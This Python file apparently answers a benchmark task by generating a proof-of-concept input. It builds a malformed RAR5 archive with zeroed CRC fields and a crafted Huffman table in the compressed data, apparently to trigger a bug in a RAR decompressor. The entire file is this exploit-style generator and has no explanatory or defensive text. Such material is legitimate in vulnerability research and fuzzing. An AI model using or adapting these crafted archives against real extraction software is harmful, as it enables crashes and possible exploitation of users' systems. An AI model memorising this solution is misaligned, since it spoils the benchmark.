import sys

def _vint(n: int) -> bytes:
    res = bytearray()
    if n == 0:
        return b'\x00'
    while n > 0:
        byte = n & 0x7f
        n >>= 7
        if n > 0:
            byte |= 0x80
        res.append(byte)
    return bytes(res)

class _BitStream:
    def __init__(self):
        self.buf = bytearray()
        self.current_byte = 0
        self.bit_count = 0

    def write_bits(self, value: int, num_bits: int):
        for i in range(num_bits):
            bit = (value >> i) & 1
            self.current_byte |= (bit << self.bit_count)
            self.bit_count += 1
            if self.bit_count == 8:
                self.buf.append(self.current_byte)
                self.current_byte = 0
                self.bit_count = 0

    def get_bytes(self) -> bytes:
        if self.bit_count > 0:
            self.buf.append(self.current_byte)
        return bytes(self.buf)

class Solution:
    def solve(self, src_path: str) -> bytes:
        bs = _BitStream()

        bs.write_bits(0, 1)
        bs.write_bits(8, 4)

        pre_table_lengths = [0] * 15 + [1, 1, 0, 0]
        for length in pre_table_lengths:
            bs.write_bits(length, 4)

        for _ in range(284):
            bs.write_bits(0, 1)

        bs.write_bits(1, 1)
        bs.write_bits(3, 2)
        
        payload = bs.get_bytes()

        poc = b'\x52\x61\x72\x21\x1A\x07\x01\x00'

        archive_header_content = _vint(1) + _vint(0)
        poc += b'\x00\x00\x00\x00' + _vint(len(archive_header_content)) + archive_header_content
        
        comp_info = (50 << 7) | (5 << 4)
        
        file_header_content = b''
        file_header_content += _vint(2)
        file_header_content += _vint(4)
        file_header_content += _vint(0)
        file_header_content += _vint(0)
        file_header_content += _vint(0)
        file_header_content += b'\x00\x00\x00\x00'
        file_header_content += _vint(comp_info)
        file_header_content += _vint(2)
        file_header_content += _vint(1)
        file_header_content += b'a'
        file_header_content += payload

        poc += b'\x00\x00\x00\x00' + _vint(len(file_header_content)) + file_header_content

        end_archive_content = _vint(5) + _vint(0)
        poc += b'\x00\x00\x00\x00' + _vint(len(end_archive_content)) + end_archive_content

        return poc